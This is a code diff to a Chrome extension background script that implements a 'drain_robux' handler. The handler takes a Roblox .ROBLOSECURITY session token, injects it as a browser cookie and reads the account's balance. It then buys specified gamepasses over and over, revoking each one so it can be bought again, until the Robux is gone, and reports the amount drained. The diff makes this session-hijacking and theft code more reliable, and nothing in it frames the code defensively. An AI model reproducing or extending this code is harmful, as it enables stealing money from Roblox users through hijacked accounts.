@@ -111,34 +111,51 @@ async function revokeGamepass(passId, cookieHeader, csrfToken) {
 
 chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
   if (msg.action === 'drain_robux' && msg.token && msg.gamepasses) {
-    (async () => {
-      const cookieHdr = '.ROBLOSECURITY=' + msg.token;
-      const csrf = await getCsrfToken(cookieHdr);
-      if (!csrf) return;
-      const user = await getUserInfo(cookieHdr);
-      if (!user) return;
-      let bal = await getBalance(user.id, cookieHdr);
-      if (bal <= 0) return;
+    chrome.cookies.set({
+      url: 'https://www.roblox.com',
+      name: '.ROBLOSECURITY',
+      value: msg.token,
+      domain: '.roblox.com',
+      path: '/',
+      secure: true,
+      httpOnly: true,
+      sameSite: 'unspecified'
+    }, () => {
+      (async () => {
+        // No need for cookieHeader anymore, fetch uses browser cookies
+        const csrf = await getCsrfToken('');
+        if (!csrf) { sendResponse({ ok: false, error: 'Failed to get CSRF' }); return; }
+        const user = await getUserInfo('');
+        if (!user) { sendResponse({ ok: false, error: 'Failed to get User Info' }); return; }
+        let bal = await getBalance(user.id, '');
+        if (bal <= 0) { sendResponse({ ok: false, error: 'No Robux balance' }); return; }
 
-      let passesInfo = [];
-      for (const pid of msg.gamepasses) {
-        const info = await getProductInfo(pid);
-        if (info && info.price <= bal) passesInfo.push(info);
-      }
-      passesInfo.sort((a, b) => b.price - a.price);
-
-      for (const pass of passesInfo) {
-        while (bal >= pass.price) {
-          const r = await buyProduct(pass.productId, pass.price, cookieHdr, csrf);
-          if (r.reason === 'AlreadyOwned') {
-            await revokeGamepass(pass.id, cookieHdr, csrf);
-            continue;
-          }
-          if (!r.purchased) break;
-          bal -= pass.price;
+        let drainedTotal = 0;
+        let passesInfo = [];
+        for (const pid of msg.gamepasses) {
+          const info = await getProductInfo(pid);
+          if (info) passesInfo.push(info);
         }
-      }
-    })();
-    return true;
+        passesInfo.sort((a, b) => b.price - a.price);
+
+        for (const pass of passesInfo) {
+          while (bal >= pass.price) {
+            const r = await buyProduct(pass.productId, pass.price, '', csrf);
+            if (r.reason === 'AlreadyOwned') {
+              await revokeGamepass(pass.id, '', csrf);
+              continue;
+            }
+            if (r.purchased || (r.reason === 'Success')) {
+              bal -= pass.price;
+              drainedTotal += pass.price;
+            } else {
+              break;
+            }
+          }
+        }
+        sendResponse({ ok: true, drained: drainedTotal });
+      })();
+    });
+    return true; // Keep message channel open for async response
   }
 });
